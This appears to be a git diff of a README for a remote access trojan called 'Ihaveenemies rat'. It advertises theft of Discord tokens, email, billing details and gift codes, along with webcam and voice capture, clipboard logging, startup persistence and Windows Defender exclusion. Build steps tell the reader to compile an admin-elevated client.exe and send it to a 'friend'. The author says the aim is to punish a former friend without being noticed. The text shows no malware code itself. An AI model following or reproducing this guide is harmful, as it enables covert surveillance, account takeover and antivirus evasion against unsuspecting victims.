@@ -1,22 +1,39 @@
-# I have enemies 
+# Ihaveenemies rat
 
-[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)
+description
 
-This virus enables the utilization of the client's camera and screen.
+## Table of Contents
+- [Features](#features)
+- [What is this](#what-is-this)
+- [Tutorial](#tutorial)
+- [License](#license)
 
-Upon building client.pyw, it operates within background processes.
+## Features
+- Discord information
+  - Email
+  - Phone
+  - Gift codes
+  - Billing
+  - HQ Guilds
+  - Token
+- Pc information
+  - System
+  - Processor 
+  - Ip-address
+  - Mac-address
+  - Boot time
+  - Memory information
+  - Disk information (Total Size, used, free, percentage) 
+- Files
+  - Camera files (some cringe files)
+  - Voice Recorder (another cringe files)
+- General functions
+  - You will get new passwords every time PC restarts (because it will rerun the program).
+  - Copy the script to a random folder on PC and place it in startup.
+  - Add this folder to exclusion to antivirus (only windows defender)
 
-## Change log for version 4v:
-- Added a console on the client page (in case there's any error on the client side). It wasn't present in version 3, but I wrote that it was.
-- Added PC information (knows everything from IP to all disks).
-- Discord token stealer (with them, you can bypass two-factor authentication and access an account).
-- Split the entire script (200 lines) into smaller files to make it clear what's happening in the code.
-- ClipboardLogger.
-
-## Todo:
-- You can add an auto-update system, but alternatively, you could make the client simply fetch the code from the server. Well, we need to think about it.
-- Key logger (don't see much point, to be honest).
-- Make it a real virus, not just a toy to play with. This condition will be met when my "friend" spends a whole day with this virus and doesn't notice anything (well, he's not really a friend anymore, and he's a hypocrite, which is why I'm making this virus to teach him a lesson).
+## What is this
+this virus 
 
 ## Tutorial:
 
@@ -27,6 +44,22 @@ Upon building client.pyw, it operates within background processes.
 5. Start your server.
 6. Build client.pyw, add file 'NoCamera.avi', add all modules and select the checkbox "--uac-admin".
 7. Share the generated client.exe file with your friend.
+
+## License
+[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)
+
+## Change log for version 4v:
+- Added a console on the client page (in case there's any error on the client side). It wasn't present in version 3, but I wrote that it was.
+- Added PC information (knows everything from IP to all disks).
+- Discord token stealer (with them, you can bypass two-factor authentication and access an account).
+- Split the entire script (200 lines) into smaller files to make it clear what's happening in the code.
+- ClipboardLogger.
+- Now it adds current folder as exclusion to antivirus
+
+## Todo:
+- You can add an auto-update system, but alternatively, you could make the client simply fetch the code from the server. Well, we need to think about it.
+- Key logger (don't see much point, to be honest).
+- Make it a real virus, not just a toy to play with. This condition will be met when my "friend" spends a whole day with this virus and doesn't notice anything (well, he's not really a friend anymore, and he's a hypocrite, which is why I'm making this virus to teach him a lesson).
 
 
 ### Requirements for server:
@@ -52,11 +85,11 @@ tkinter
 ```
 
 ### How to delete this:
-1. go to antivirus and delete exclusion folder
+- Go to the antivirus and delete the exclusion folder.
 
 ### Known issues:
 1. Working only on Windows
-2. Working only if antivirus is windows defender
+2. Works only if the antivirus is Windows Defender.
 
 
 # DISCLAIMER: THIS IS FOR EDUCATIONAL PURPOSES ONLY.
